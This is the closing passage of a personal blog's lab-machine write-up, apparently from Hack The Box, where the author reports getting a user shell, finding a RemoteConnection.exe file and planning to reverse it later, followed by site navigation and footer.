+</span></span></code></pre></div><p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p><p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p><p>Until nex write up!</p></div></article></main><div class=post-nav><hr><div class=post-nav-left><a href=https://ceso.github.io/posts/2020/craft/>&#8612; Previous Post</a></div><div class=post-nav-right><a href=https://ceso.github.io/posts/2020/ai/>Next Post &#8614;</a></div></div><aside><h3>Latest Posts</h3><ul><li><a href=https://ceso.github.io/posts/2025/wehmutig.de/>Wehmütig</a></li><li><a href=https://ceso.github.io/posts/2025/zerdenken.de/>Zerdenken</a></li><li><a href=https://ceso.github.io/posts/2022/soc145ransomwaredetected/>SOC145 - Ransomware Detected</a></li></ul></aside></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
+|
+<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
+|
+<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
+<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
+<a href=http://www.gohugo.io/>Hugo</a> by ceso,
+using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
+<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
+which was influenced by the theme
+<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer></div></body></html>
